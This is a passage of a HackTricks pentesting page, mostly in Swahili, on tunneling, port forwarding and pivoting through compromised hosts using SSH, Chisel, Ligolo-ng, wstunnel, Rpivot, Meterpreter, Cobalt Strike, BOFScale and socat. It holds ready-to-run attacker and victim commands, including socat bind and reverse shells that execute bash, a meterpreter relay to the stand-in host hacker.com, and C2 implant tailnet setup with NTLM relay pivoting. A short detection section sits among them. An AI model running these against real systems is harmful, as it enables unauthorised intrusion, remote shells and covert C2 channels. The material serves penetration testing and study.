# Tunneling and Port Forwarding

{{#include ../banners/hacktricks-training.md}}

Ili kuchapisha huduma ya HTTP au TCP ya ndani kupitia relay ya umma, tazama [kufichua huduma za ndani kwenye intaneti](expose-local-to-the-internet.md). Sura hii inahusu forwarding na pivoting kati ya host.

## Dokezo la Nmap

> [!WARNING]
> Usaidizi wa proxy wa Nmap una mipaka kwenye miunganisho ya TCP na hauathiri uchanganuzi wa ping, port au utambuzi wa OS. Wakati scanner iko nyuma ya proxy ya SOCKS, **zima ugunduzi wa host** (`-Pn`) na utumie **uchanganuzi wa muunganisho wa TCP** (`-sT`).<sup>[[5]](#references)</sup>

## **Bash**

**Host -> Jump -> InternalA -> InternalB**

Amri ya mwisho hutumia chaguo za `-u` na `-i` za Evil-WinRM kutambua akaunti na host ya WinRM; port yake chaguomsingi ya WinRM ni 5985.<sup>[[4]](#references)</sup>

```bash
# On the jump server connect the port 3333 to the 5985
mknod backpipe p;
nc -lvnp 5985 0<backpipe | nc -lvnp 3333 1>backpipe

# On InternalA accessible from Jump and can access InternalB
## Expose port 3333 and connect it to the winrm port of InternalB
exec 3<>/dev/tcp/internalB/5985
exec 4<>/dev/tcp/Jump/3333
cat <&3 >&4 &
cat <&4 >&3 &

# From the host, you can now access InternalB from the Jump server
evil-winrm -u username -i Jump
```

## **SSH**

OpenSSH inaweza kuelekeza miunganisho ya X11, milango yoyote ya TCP, na soketi za Unix-domain kupitia chaneli yake iliyosimbwa kwa njia fiche.<sup>[[6]](#references)</sup>

Muunganisho wa picha wa SSH (X)

`-Y` huwasha uelekezaji wa X11 unaoaminika, na `-C` huomba data inayoelekezwa ibanwe.<sup>[[6]](#references)</sup>

```bash
ssh -Y -C <user>@<ip> #-Y is less secure but faster than -X
```

### Remote Port2Port

Fungua Port mpya kwenye SSH Server --> Port nyingine

Remote (`-R`) forwarding husikiliza kwenye seva ya SSH na kuunganisha upande wa ndani; anwani ya bind iliyoainishwa hudhibiti ni miingiliano ipi inayoweza kufikia msikilizaji huyo.<sup>[[6]](#references)</sup>

```bash
ssh -R 0.0.0.0:10521:127.0.0.1:1521 user@10.0.0.1 #Local port 1521 accessible in port 10521 from everywhere
```

```bash
ssh -R 0.0.0.0:10521:10.0.0.1:1521 user@10.0.0.1 #Remote port 1521 accessible in port 10521 from everywhere
```

### Port2Port

Local port --> Compromised host (SSH) --> Third_box:Port

Local (`-L`) forwarding husikiliza kwenye client na kuunganisha kwenye destination kutoka upande wa SSH server.<sup>[[6]](#references)</sup>

```bash
ssh -i ssh_key <user>@<ip_compromised> -L <attacker_port>:<ip_victim>:<remote_port> [-p <ssh_port>] [-N -f]  #This way the terminal is still in your host
#Example
sudo ssh -L 631:<ip_victim>:631 -N -f -l <username> <ip_compromised>
```

### Port2hostnet (proxychains)

Porti ya ndani --> compromised host (SSH) --> Popote

Dynamic forwarding (`-D`) huunda listener ya ndani ya SOCKS4/SOCKS5 ambayo miunganisho yake huanzishwa kutoka upande wa mbali.<sup>[[6]](#references)</sup>

```bash
ssh -f -N -D <attacker_port> <username>@<ip_compromised> #All sent to local port will exit through the compromised server (use as proxy)
```

### Multi-hop kupitia ProxyJump

`-J`/`ProxyJump` huunganisha kwenye target kupitia jump host moja au zaidi zilizotenganishwa kwa koma. Chaguo za forwarding bado zinahusu muunganisho wa mwisho wa SSH, kwa hivyo SOCKS listener iliyo hapa chini hufungua destinations kutoka `internal-target`, si kutoka kwenye bastion ya kwanza. Hii huepusha kuingia kwenye jump host na kuanzisha SSH client ya pili hapo.<sup>[[6]](#references)</sup>

```bash
# Reach the final SSH server through two bastions
ssh -J user1@jump1:22,user2@jump2:22 user3@internal-target

# Create a local SOCKS proxy whose connections exit from internal-target
ssh -J user1@jump1,user2@jump2 -N -D 127.0.0.1:1080 user3@internal-target
```

Chaguo mahususi kwa host za kurukia zinapaswa kuwekwa kwenye `~/.ssh/config`; usanidi wa mstari wa amri uliokusudiwa kwa host lengwa hautumiki kiotomatiki kwa host za kati.<sup>[[6]](#references)</sup>

### Reverse Port Forwarding

Hii ni muhimu ili kupata reverse shells kutoka kwa host za ndani kupitia DMZ hadi kwenye host yako:

Mpangilio wa `GatewayPorts` wa server hudhibiti iwapo remote forward inaweza kufungamana nje ya loopback; thamani yake chaguomsingi ni `no`.<sup>[[7]](#references)</sup>

```bash
ssh -i dmz_key -R <dmz_internal_ip>:443:0.0.0.0:7000 root@10.129.203.111 -vN
# Now you can send a rev to dmz_internal_ip:443 and capture it in localhost:7000
# Note that port 443 must be open
# Also, remmeber to edit the /etc/ssh/sshd_config file on Ubuntu systems
# and change the line "GatewayPorts no" to "GatewayPorts yes"
# to be able to make ssh listen in non internal interfaces in the victim (443 in this case)
```

### VPN-Tunnel

Mfano huu unaotumia root huunda vifaa vya tunnel kwenye host zote mbili. Server lazima iruhusu tun forwarding, na akaunti iliyochaguliwa lazima iwe na ufikiaji wa kifaa cha tun; `PermitRootLogin yes` ni njia mojawapo ya kutumia akaunti ya `root` hapa.<sup>[[6]](#references)[[7]](#references)</sup>\
`PermitRootLogin yes`\
`PermitTunnel yes`

```bash
ssh root@server -w any:any #This will create Tun interfaces in both devices
ip addr add 1.1.1.2/32 peer 1.1.1.1 dev tun0 #Client side VPN IP
ip link set tun0 up #Activate the client side network interface
ip addr add 1.1.1.1/32 peer 1.1.1.2 dev tun0 #Server side VPN IP
ip link set tun0 up #Activate the server side network interface
```

Wezesha forwarding upande wa seva

```bash
echo 1 > /proc/sys/net/ipv4/ip_forward
iptables -t nat -A POSTROUTING -s 1.1.1.2 -o eth0 -j MASQUERADE
```

Weka njia mpya upande wa mteja

```
route add -net 10.0.0.0/16 gw 1.1.1.1
```

> [!NOTE]
> **Usalama – Terrapin Attack (CVE-2023-48795)**  
> OpenSSH 9.6 iliongeza extension ya strict-KEX ili kukabiliana na shambulio la Terrapin la kuvunja integrity ya early-transport. Sasisha pande zote mbili inapowezekana na ufuate maelekezo ya vendor kwa implementations za zamani, badala ya kudhani kuwa channel iliyoforwardiwa inalindwa kwa sababu ya version pekee.<sup>[[8]](#references)</sup>

## SSHUTTLE

Unaweza **tunnel** kupitia **ssh** ili kuelekeza **traffic** yote ya **subnetwork** kupitia host.\
Kwa mfano, kuelekeza traffic yote inayoenda kwa 10.10.10.0/24

`sshuttle` hutoa proxying ya uwazi kupitia SSH na inaruhusu kuchagua subnets na kutumia amri maalum ya SSH, kama inavyoonyeshwa hapa chini.<sup>[[9]](#references)</sup>

```bash
pip install sshuttle
sshuttle -r user@host 10.10.10.10/24
```

Unganisha kwa kutumia private key

```bash
sshuttle -D -r user@host 10.10.10.10 0/0 --ssh-cmd 'ssh -i ./id_rsa'
# -D : Daemon mode
```

## Meterpreter

`portfwd` ya Metasploit inasaidia local na remote forwarding, huku moduli yake ya SOCKS proxy ikikusudiwa kufanya kazi na session routes au `autoroute` na kusikiliza kwenye port 1080 kwa chaguomsingi katika mifano hii.<sup>[[10]](#references)[[11]](#references)[[12]](#references)</sup>

### Port2Port

Local port --> Compromised host (active session) --> Third_box:Port

```bash
# Inside a meterpreter session
portfwd add -l <attacker_port> -p <Remote_port> -r <Remote_host>
```

### SOCKS

```bash
background# meterpreter session
route add <IP_victim> <Netmask> <Session> # (ex: route add 10.10.10.14 255.255.255.0 8)
use auxiliary/server/socks_proxy
run #Proxy port 1080 by default
echo "socks4 127.0.0.1 1080" > /etc/proxychains.conf #Proxychains
```

Njia nyingine:

```bash
background #meterpreter session
use post/multi/manage/autoroute
set SESSION <session_n>
set SUBNET <New_net_ip> #Ex: set SUBNET 10.1.13.0
set NETMASK <Netmask>
run
use auxiliary/server/socks_proxy
set VERSION 4a
run #Proxy port 1080 by default
echo "socks4 127.0.0.1 1080" > /etc/proxychains.conf #Proxychains
```

## Cobalt Strike

Beacon ya Cobalt Strike inaweza kuelekeza miunganisho ya SOCKS4a/SOCKS5 kupitia Beacon; `rportfwd` hufunga porti kwenye hosti iliyoathiriwa, huku `rportfwd_local` ikianzisha muunganisho wa kwenda kwenye lengwa kutoka kwa mteja wa Cobalt Strike.<sup>[[13]](#references)[[14]](#references)</sup>

### SOCKS proxy

Fungua porti kwenye Team Server kwenye interfaces zinazopaswa kuelekeza trafiki kupitia Beacon.<sup>[[13]](#references)</sup>

```bash
beacon> socks 1080
[+] started SOCKS4a server on: 1080

# Set port 1080 as proxy server in proxychains.conf
proxychains nmap -n -Pn -sT -p445,3389,5985 10.10.17.25
```

### rPort2Port

> [!WARNING]
> Katika hali hii, **port hufunguliwa kwenye host ya Beacon**, si kwenye Team Server, na traffic hutumwa kwa Team Server kisha kutoka hapo hadi host:port iliyoonyeshwa.<sup>[[14]](#references)</sup>

```bash
rportfwd [bind port] [forward host] [forward port]
rportfwd stop [bind port]
```

Mwongozo wa reverse-forwarding unaeleza tabia ifuatayo:<sup>[[14]](#references)</sup>

- Reverse port forward ya Beacon imeundwa **ku-tunnel traffic hadi Team Server, si kwa ku-relay traffic kati ya mashine mahususi**.
- Traffic **hu-tunnel ndani ya traffic ya C2 ya Beacon**, ikijumuisha viungo vya P2P.
- Kwa kawaida, ports za juu huepuka vizuizi vya privileged ports, lakini sera ya OS lengwa na listeners zilizopo bado hutumika.

### rPort2Port local

> [!WARNING]
> Katika hali hii, **port hufunguliwa kwenye host ya Beacon**, si kwenye Team Server, na **traffic hutumwa kwa client ya Cobalt Strike** (si kwa Team Server), kisha kutoka hapo hadi kwenye host:port iliyoonyeshwa.<sup>[[14]](#references)</sup>

```bash
rportfwd_local [bind port] [forward host] [forward port]
rportfwd_local stop [bind port]
```

## Overlay ya userspace ya Yggdrasil kwa kutumia yggstack

[Yggstack](https://github.com/yggdrasil-network/yggstack) hujiunga na mesh ya IPv6 iliyosimbwa ya Yggdrasil bila kiolesura cha TUN au ruhusa za msimamizi. Hutoa listener ya ndani ya SOCKS5 kwa miunganisho inayoingia kwenye overlay na forwarding ya TCP katika mwelekeo wowote.<sup>[[64]](#references)</sup> Pivot lazima iweze kufikia peer iliyosanidiwa, na endpoint ya operator pia lazima ijiunge na mesh ili kufikia anwani yake ya overlay.<sup>[[65]](#references)</sup>

Tengeneza configuration na uongeze URI ya peer inayofikika kwenye sehemu yake ya `Peers`, kisha uchague listener ya SOCKS au hali ya kufichua port ya mbali.<sup>[[64]](#references)[[65]](#references)</sup> Hali hii ya mwisho hufichua huduma iliyofungwa kwenye `127.0.0.1:8080` kupitia port `18080` ya anwani ya Yggdrasil ya node, si kwenye Internet ya kawaida. Kwenye mesh ya umma, node nyingine za overlay zinaweza kufikia huduma iliyofichuliwa, kwa hiyo muunganisho wa peer si mpaka wa udhibiti wa ufikiaji.<sup>[[64]](#references)[[66]](#references)</sup> Amri zilizo hapa chini ni uendeshaji mbadala wa node hiyo hiyo.<sup>[[64]](#references)</sup>

```bash
./yggstack -genconf > yggdrasil.conf
# Add a peer URI to the Peers section of yggdrasil.conf first.
./yggstack -useconffile yggdrasil.conf -socks 127.0.0.1:1080
./yggstack -useconffile yggdrasil.conf -remote-tcp 18080:127.0.0.1:8080
```

Agent ya Go inaweza kupachika stack ya userspace badala ya kuzindua mchakato tofauti wa `yggstack`. ESET ilieleza utekelezaji uliounda utambulisho mpya wa Ed25519 kila ulipoanza, na hivyo kubadilisha anwani yake ya overlay ya IPv6, na kuweka `NodeInfo` tupu pamoja na `NodeInfoPrivacy` ili kupunguza metadata ya nodi inayofichuliwa. Iliwasiliana na endpoint ya HTTPS ndani ya mesh na ingeweza kufichua listener ya TCP ya ndani kupitia anwani yake ya overlay.<sup>[[64]](#references)[[67]](#references)</sup>

Overlay inaweza kuficha lengwa la mwisho lisitambulike kwenye mwonekano wa kawaida wa egress, lakini haiwezi kuficha miunganisho ya peer au anwani ya IP ya chanzo inayoonekana kwa peers wa moja kwa moja. Yggdrasil haitoi kutokujulikana.<sup>[[66]](#references)[[67]](#references)</sup> Angalia [faragha ya mtandao na muunganisho usiotambulisha mtumiaji](../privacy/network-privacy-and-anonymous-connectivity.md) kwa tofauti kati ya usafirishaji uliosimbwa kwa njia fiche na kutokujulikana.

## Tailcat: uelekezaji wa TCP wa userspace bila akaunti

Tailcat hutumia data plane ya WireGuard/NAT-traversal/DERP ya Tailscale bila control plane ya Tailscale. Haihitaji akaunti ya Tailscale wala ruhusa za msimamizi, na haisakinishi host routes wala kubadilisha DNS. Tofauti na [Tailscale Serve/Funnel](expose-local-to-the-internet.md#tailscale-funnel--serve) au [tailnet ya BOFScale inayoendeshwa ndani ya mchakato](#bofscale---cdn-fronted-in-process-tailnet), seva hushiriki *anwani ya tailcat* nje ya njia ya kawaida. Mteja hutumia anwani hiyo kufikia port inayotolewa na nodi ya mbali.<sup>[[62]](#references)</sup>

Kwa huduma ya TCP ambayo tayari inasikiliza kwenye port `4444` ya nodi ya mbali, anzisha `serve` hapo kisha upitishe anwani itakayoonyeshwa kwa `forward` kwenye mteja. Amri ya pili hufunga `127.0.0.1:18080` kwa chaguomsingi, kwa hivyo mchakato wa ndani unaotumia soketi za kawaida za TCP pekee unaweza kuunganisha kwenye port hiyo ya loopback huku Tailcat ikisafirisha trafiki yake hadi port `4444` ya mbali.<sup>[[62]](#references)</sup> Nambari za port si maalum kwa Tailcat.<sup>[[62]](#references)</sup>

```bash
# Remote node with a service on localhost:4444
tailcat serve 4444
# Client node; replace the placeholder with the address printed above
tailcat forward <tc-address> 18080:4444
```

Anwani ina public key ya WireGuard ya server na, kwa chaguomsingi katika matoleo ya sasa, pre-shared key. Ichukulie kama credential: server isiyo na vizuizi humkubali peer anayejua anwani hiyo. Anwani ya muda huacha kufanya kazi server inapoisha. Key ya `default` iliyohifadhiwa hufanya `serve` ya kawaida itumie tena anwani thabiti katika uendeshaji unaofuata, kwa hiyo angalia ujumbe wa kuanzisha na uweke vizuizi kwa clients kwa kutumia `serve --allow` ikiwa anwani inaweza kufichuka.<sup>[[62]](#references)</sup>

Miunganisho inaweza kutumia njia ya moja kwa moja ya UDP au relay ya DERP. Hii huepusha hitaji la domain maalum ya C2 lakini haifanyi shughuli za mtandao kutoweka.<sup>[[62]](#references)[[63]](#references)</sup>

## BOFScale - tailnet ya ndani ya mchakato inayopitishwa kupitia CDN

[BOFScale](https://github.com/NetSPI/BOFscale) huendesha overlay ya Tailscale iliyorekebishwa ndani ya Windows C2 implant bila kusakinisha TUN driver au service. Vipengele vyake vitatu ni BOF-PE ya `tailscaled` ya CGo `c-shared` inayofanya kazi asynchronously, BOF-PE ndogo ya C++ inayowasiliana na local API, na daraja la TCP-to-SOCKS5 la `socksportfwd` linalofanya kazi asynchronously.<sup>[[53]](#references)[[54]](#references)</sup>

### TS2021 na DERP zinazoendana na CDN

Kwa kawaida, Tailscale hutumia HTTP upgrades za umiliki kwa control channel ya TS2021 inayotumia Noise na relay ya DERP. BOFScale huhifadhi byte streams hizo lakini huzibeba ndani ya RFC 6455 WebSockets, kwa kutumia `Sec-WebSocket-Protocol: ts2021` au `derp`, ili origin ya Headscale/DERP inayodhibitiwa na operator iweze kuwekwa nyuma ya CDN inayokubali WebSocket upgrades za kawaida pekee. Client iliyorekebishwa hujaribu tena TS2021 kupitia WebSockets baada ya HTTP `500`, hujaribu tena DERP baada ya HTTP `426`, na hufanya DERP WebSocket dialer itumie usanidi wa host proxy; BOF huweka `TS_DEBUG_DERP_WS_CLIENT=1` ili kuruka jaribio la kwanza linalojulikana kushindwa.<sup>[[53]](#references)[[54]](#references)</sup>

CDN na origin proxy lazima zihifadhi WebSocket upgrades za `/ts2021` na `/derp`, ziwasilishe `/key` kama HTTP ya kawaida, na zizime read/write timeouts za ndani kwa sababu relay sessions zinaweza kubaki wazi bila kikomo. Usanidi wa Headscale uliotolewa huwasha `verify_clients`, huchapisha DERP map iliyopachikwa ya operator pekee, na huacha `derp.urls` tupu ili kuzuia fallback kwa relays zinazoendeshwa na Tailscale.<sup>[[53]](#references)[[54]](#references)</sup>

### Daemon ya ndani ya mchakato na udhibiti wa named pipe

Isipokuwa ibadilishwe, entry point ya BOF huanzisha `tailscaled` kwa kutumia `-tun=userspace-networking`, `-state mem:`, na `-no-logs-no-support`, kisha huunda pipe yenye jina la UUID. Huelekeza Go stdout/stderr kupitia OS pipe kwenda kwenye Beacon output API, hivyo daemon kamili na Go runtime hubaki kwenye memory, lakini state na logs haziandikwi kwenye directory ya Tailscale.<sup>[[53]](#references)[[54]](#references)</sup>

Client nyepesi huiga local API ya Tailscale ya HTTP/1.0 kupitia pipe hiyo. Hufungua pipe kwa `SECURITY_SQOS_PRESENT | SECURITY_IMPERSONATION` kwa sababu safu ya `safesocket` ya daemon hujifanya kuwa client wa pipe, hutuma `Tailscale-Cap: 125`, na huunganisha local API na shughuli za `up`, `down`, `status`, utangazaji wa route, na kuzima.<sup>[[53]](#references)[[54]](#references)</sup>

> [!WARNING]
> Usiondoe Go BOF-PE iliyopakiwa kwa mikono baada ya kuiomba daemon izime: goroutines za runtime na garbage collector zinaweza kuendelea kutekelezwa kutoka kwenye memory ambayo loader inaondoa ramani yake. Endesha `tailscaled` katika mchakato wa kutupwa na usimamishe mchakato huo kwa usafishaji wa mwisho.<sup>[[54]](#references)</sup>

### Pitisha trafiki inayoanzia kwenye host kupitia userspace SOCKS5

Miunganisho inayoingia ya tailnet na subnet routes zilizotangazwa hufanya kazi ndani ya userspace network stack, lakini michakato ya kawaida kwenye host iliyoathiriwa haina OS route inayoingia kwenye overlay. Kwa hiyo, `socksportfwd` husikiliza kwenye TCP port inayofikiwa upande wa victim, huanzisha mazungumzo ya SOCKS5 `NO AUTH` na listener ya daemon ya `0.0.0.0:1080`, hutuma `CONNECT` kwa destination ya tailnet, na hupeleka data pande zote mbili asynchronously. Target ikiwa ni jina la MagicDNS, hutumia `ATYP_DOMAIN`, hivyo `tailscaled` hutatua jina hilo bila kulifichua kwa Windows resolver.<sup>[[53]](#references)[[54]](#references)</sup>

Mtiririko wa chini kabisa wa operator umeonyeshwa hapa chini; node ya operator na implant lazima zitumie binaries zilizorekebishwa kwa sababu Tailscale ya kawaida haiwezi kupita kwenye muundo huu wa CDN.<sup>[[53]](#references)[[54]](#references)</sup>

```bash
HEADSCALE_HOSTNAME=<cdn-hostname> docker compose up
# Start tailscaled as an asynchronous BOF and copy its printed pipe name
tailscaled
tailscale --socket '\\.\pipe\<uuid>' up --auth-key <key> --login-server https://<cdn-hostname>
tailscale --socket '\\.\pipe\<uuid>' set --advertise-routes <victim-cidr>
socksportfwd --t <operator-magicdns-name> --tp 8888 --p 8888
```

Forward ya ndani inaweza kutenganisha listener ya uthibitishaji inayoonekana na zana ya relay: lazimisha mashine ithibitishe utambulisho wake kwenye port iliyofungwa ya host iliyoathiriwa, pitisha trafiki hiyo kupitia tailnet hadi `ntlmrelayx`, kisha ipeleke kwa AD CS, LDAP, HTTP, SMB, au target nyingine inayooana. Tazama [WebDAV NTLM coercion](../windows-hardening/ntlm/places-to-steal-ntlm-creds.md#webdav-auth-coercion--credential-validation-via-davclntdlldavsetcookie) na [ESC8 relay to AD CS](../windows-hardening/active-directory-methodology/ad-certificates/domain-escalation.md#ntlm-relay-to-ad-cs-http-endpoints--esc8) kwa hatua mahususi za udhaifu; BOFScale ni ya usafirishaji tu.<sup>[[54]](#references)</sup>

### Utambuzi

Tafuta mchanganyiko wa viashiria badala ya kutegemea kiashiria kimoja dhaifu: runtime ya Go katika mchakato ambao kwa kawaida hautumii Go, pipe ya UUID yenye SDDL ruhusu `D:(A;;GA;;;WD)`, listener ya SOCKS isiyotarajiwa kwenye `0.0.0.0:1080`, na WebSocket za TLS zinazodumu kwa muda mrefu hadi kwenye anwani za CDN. Ukaguzi wa TLS ukiwa umewashwa, weka alama kwenye `Sec-WebSocket-Protocol: derp` au `ts2021` ikiwa mchakato unaomiliki si huduma ya `tailscaled` iliyoidhinishwa. Kanuni za `bofscale.yar` za repository zina saini za kumbukumbu za vipengele vyote vitatu vya BOF-PE.<sup>[[53]](#references)[[54]](#references)</sup>

## reGeorg

[https://github.com/sensepost/reGeorg](https://github.com/sensepost/reGeorg)

Mradi huu hutoa endpoints za web tunnel kama vile `tunnel.aspx`, `tunnel.ashx`, `tunnel.jsp`, na `tunnel.php`; pakia endpoint moja inayotumika kabla ya kuanzisha proxy ya ndani.<sup>[[15]](#references)</sup>

```bash
python reGeorgSocksProxy.py -p 8080 -u http://upload.sensepost.net:8080/tunnel/tunnel.jsp
```

## Chisel

Unaweza kuipakua kutoka kwenye ukurasa wa matoleo wa [https://github.com/jpillora/chisel](https://github.com/jpillora/chisel)\
Chisel hupitisha trafiki ya TCP/UDP kupitia HTTP kwa kutumia muunganisho unaolindwa na SSH; tumia matoleo yanayooana ya client/server na uhakikishe sintaksia ya amri ya toleo ulilochagua.<sup>[[16]](#references)</sup>

### socks

```bash
./chisel server -p 8080 --reverse #Server -- Attacker
./chisel-x64.exe client 10.10.14.3:8080 R:socks #Client -- Victim
#And now you can use proxychains with port 1080 (default)

./chisel server -v -p 8080 --socks5 #Server -- Victim (needs to have port 8080 exposed)
./chisel client -v 10.10.10.10:8080 socks #Attacker
```

### Port forwarding

```bash
./chisel_1.7.6_linux_amd64 server -p 12312 --reverse #Server -- Attacker
./chisel_1.7.6_linux_amd64 client 10.10.14.20:12312 R:4505:127.0.0.1:4505 #Client -- Victim
```

## wstunnel

[`wstunnel`](https://github.com/erebe/wstunnel) hupitisha forward za static au dynamic kupitia WebSocket, HTTP/2, au WebTransport (HTTP/3 juu ya QUIC). Builds za sasa zinaunga mkono TCP, UDP, Unix sockets, stdio, SOCKS5, HTTP proxying, na listeners za Linux transparent-proxy katika modes za forward na reverse.<sup>[[52]](#references)</sup>

### Reverse SOCKS5 pivot

Endesha server kwenye attacker na ufanye pivot iunganishe kwa njia ya outbound kwa kutumia `-R`. Katika mwelekeo huu, listener ya SOCKS5 huundwa kwenye **server**, huku connections zinazoombwa zikianzia kwenye mtandao wa **client/pivot**.<sup>[[52]](#references)</sup>

```bash
# Attacker: use a certificate valid for pivot.example
wstunnel server --tls-certificate cert.pem --tls-private-key key.pem wss://0.0.0.0:443

# Pivot: expose an attacker-side, loopback-only SOCKS5 listener
wstunnel client --tls-verify-certificate \
  -R 'socks5://127.0.0.1:1080' wss://pivot.example:443

# Attacker
proxychains nmap -n -Pn -sT -p 445,3389 10.10.10.0/24
```

Reverse static forward hutumia mwelekeo uleule. Kwa mfano, ifuatayo huweka `10.10.10.20:445`, kama inavyofikiwa kupitia pivot, kwenye loopback port `8445` ya mshambuliaji:<sup>[[52]](#references)</sup>

```bash
wstunnel client --tls-verify-certificate \
  -R 'tcp://127.0.0.1:8445:10.10.10.20:445' wss://pivot.example:443
```

### Maelezo ya Egress na transport

- Ongeza `-p http://user:pass@proxy:8080` kwa client ili kupita kwenye HTTP proxy iliyo wazi. Tumia `socks5h://127.0.0.1:1080` katika clients kama `curl` (au wezesha proxied DNS kwenye application) ili majina ya ndani yatatuliwe upande wa pili wa tunnel badala ya kuvuja kwa resolver ya ndani.<sup>[[52]](#references)</sup>
- `wss://` huchagua WebSocket iliyolindwa kwa TLS. Client ya `https://` huchagua HTTP/2, lakini buffering au ubadilishaji wa HTTP/1 unaofanywa na reverse proxies/CDNs mara nyingi huvuruga stream ya pande mbili; wakati wa kujaribu hali hii, onyesha server ya wstunnel moja kwa moja.<sup>[[52]](#references)</sup>
- `wts://` huchagua WebTransport kupitia QUIC. Anzisha server kwa `--enable-webtransport` (au URL ya kusikiliza ya `wts://`) na uruhusu UDP kwenye port ya kusikiliza. Hali hii haiwezi kupita kwenye HTTP `CONNECT` proxy ya kawaida kwa sababu proxy hiyo husafirisha TCP.<sup>[[52]](#references)</sup>

> [!WARNING]
> Mradi wa upstream unaonya usichukulie certificate yake ya kujisaini iliyopachikwa kuwa kinga ya faragha. Pendelea certificate maalum iliyo halali pamoja na `--tls-verify-certificate` (au mTLS), weka proxy listeners kwenye loopback isipokuwa ufikiaji wa mbali unakusudiwa, na tumia tunnel kwa protocols ambazo tayari ni salama wakati usiri ni muhimu.<sup>[[52]](#references)</sup>

## Ligolo-ng

[https://github.com/nicocha30/ligolo-ng](https://github.com/nicocha30/ligolo-ng)

Mwongozo wa kuanza haraka wa Ligolo-ng unaeleza interface ya TUN kwenye proxy, uthibitishaji wa alama ya vidole ya certificate kwa agent, na usanidi wa route kwa mtandao unaopitishwa kwenye tunnel.<sup>[[17]](#references)</sup>

### Tunneling

```bash
# Start proxy server and automatically generate self-signed TLS certificates -- Attacker
sudo ./proxy -selfcert
# Create an interface named "ligolo" -- Attacker
interface_create --name "ligolo"
# Print the currently used certificate fingerprint -- Attacker
certificate_fingerprint
# Start the agent with certification validation -- Victim
./agent -connect <ip_proxy>:11601 -v -accept-fingerprint <fingerprint>
# Select the agent -- Attacker
session
1
# Start the tunnel on the proxy server -- Attacker
tunnel_start --tun "ligolo"
# Display the agent's network configuration -- Attacker
ifconfig
# Create a route to the agent's specified network -- Attacker
interface_add_route --name "ligolo" --route <network_address_agent>/<netmask_agent>
# Display the tun interfaces -- Attacker
interface_list
```

### Kufunga Agent na Kusikiliza

Ligolo-ng inaweza kuongeza wasikilizaji kwenye agent wanaosambaza trafiki kwa anwani ya upande wa proxy, na masafa yake yaliyohifadhiwa ya `240.0.0.0/4` yanaweza kuelekezwa ili kufikia huduma za ndani za agent.<sup>[[18]](#references)[[19]](#references)</sup>

```bash
# Establish a tunnel from the proxy server to the agent
# Create a TCP listening socket on the agent (0.0.0.0) on port 30000 and forward incoming TCP connections to the proxy (127.0.0.1) on port 10000 -- Attacker
listener_add --addr 0.0.0.0:30000 --to 127.0.0.1:10000 --tcp
# Display the currently running listeners on the agent -- Attacker
listener_list
```

### Kufikia Bandari za Ndani za Agent

```bash
# Establish a tunnel from the proxy server to the agent
# Create a route to redirect traffic for 240.0.0.1 to the Ligolo-ng interface to access the agent's local services -- Attacker
interface_add_route --name "ligolo" --route 240.0.0.1/32
```

## Rpivot

[https://github.com/klsecservices/rpivot](https://github.com/klsecservices/rpivot)

Rpivot huanzisha reverse tunnel kutoka kwa mwathiriwa na kufichua SOCKS4 proxy kwenye anwani ya loopback ya mshambuliaji; README yake pia inaeleza credentials za NTLM-proxy na chaguo za hash.<sup>[[20]](#references)</sup>

```bash
attacker> python server.py --server-port 9999 --server-ip 0.0.0.0 --proxy-ip 127.0.0.1 --proxy-port 1080
```

```bash
victim> python client.py --server-ip <rpivot_server_ip> --server-port 9999
```

Pivot kupitia **NTLM proxy**

```bash
victim> python client.py --server-ip <rpivot_server_ip> --server-port 9999 --ntlm-proxy-ip <proxy_ip> --ntlm-proxy-port 8080 --domain CONTOSO.COM --username Alice --password P@ssw0rd
```

```bash
victim> python client.py --server-ip <rpivot_server_ip> --server-port 9999 --ntlm-proxy-ip <proxy_ip> --ntlm-proxy-port 8080 --domain CONTOSO.COM --username Alice --hashes 9b9850751be2515c8231e5189015bbe6:49ef7638d69a01f26d96ed673bf50c45
```

## **Socat**

[https://github.com/andrew-d/static-binaries](https://github.com/andrew-d/static-binaries)

Socat huunganisha aina za anwani kama `TCP-LISTEN`, `EXEC`, `SOCKS4A`, `OPENSSL`, na `PROXY`; mifano iliyo hapa chini inachanganya endpoints hizo zilizoandikwa kwenye nyaraka.<sup>[[21]](#references)</sup>

### Bind shell

```bash
victim> socat TCP-LISTEN:1337,reuseaddr,fork EXEC:bash,pty,stderr,setsid,sigint,sane
attacker> socat FILE:`tty`,raw,echo=0 TCP4:<victim_ip>:1337
```

### Reverse shell

```bash
attacker> socat TCP-LISTEN:1337,reuseaddr FILE:`tty`,raw,echo=0
victim> socat TCP4:<attackers_ip>:1337 EXEC:bash,pty,stderr,setsid,sigint,sane
```

### Port2Port

```bash
socat TCP4-LISTEN:<lport>,fork TCP4:<redirect_ip>:<rport> &
```

### Port2Port kupitia SOCKS

```bash
socat TCP4-LISTEN:1234,fork SOCKS4A:127.0.0.1:google.com:80,socksport=5678
```

### Meterpreter kupitia SSL Socat

```bash
#Create meterpreter backdoor to port 3333 and start msfconsole listener in that port
attacker> socat OPENSSL-LISTEN:443,cert=server.pem,cafile=client.crt,reuseaddr,fork,verify=1 TCP:127.0.0.1:3333
```

```bash
victim> socat.exe TCP-LISTEN:2222 OPENSSL,verify=1,cert=client.pem,cafile=server.crt,connect-timeout=5|TCP:hacker.com:443,connect-timeout=5
#Execute the meterpreter
```

Unaweza kuelekeza muunganisho kupitia **proxy isiyohitaji uthibitishaji** kwa kutumia aina ya anwani `PROXY` iliyoelezwa kwenye nyaraka za socat, kwa kutekeleza mstari huu badala ya ule wa mwisho kwenye console ya mwathiriwa.<sup>[[21]](#references)</sup>

```bash
OPENSSL,verify=1,cert=client.pem,cafile=server.crt,connect-timeout=5|PROXY:hacker.com:443,connect-timeout=5|TCP:proxy.lan:8080,connect-timeout=5
```

[https://funoverip.net/2011/01/reverse-ssl-backdoor-with-socat-and-metasploit/](https://funoverip.net/2011/01/reverse-ssl-backdoor-with-socat-and-metasploit/)

### SSL Socat Tunnel

**/bin/sh console**

Tengeneza vyeti pande zote mbili: Client na Server

```bash
# Execute these commands on both sides
FILENAME=socatssl
openssl genrsa -out $FILENAME.key 1024
openssl req -new -key $FILENAME.key -x509 -days 3653 -out $FILENAME.crt
cat $FILENAME.key $FILENAME.crt >$FILENAME.pem
chmod 600 $FILENAME.key $FILENAME.pem
```

```bash
attacker-listener> socat OPENSSL-LISTEN:433,reuseaddr,cert=server.pem,cafile=client.crt EXEC:/bin/sh
victim> socat STDIO OPENSSL-CONNECT:localhost:433,cert=client.pem,cafile=server.crt
```

### Remote Port2Port

Unganisha porti ya ndani ya SSH (22) na porti 443 kwenye host ya mshambuliaji.

```bash
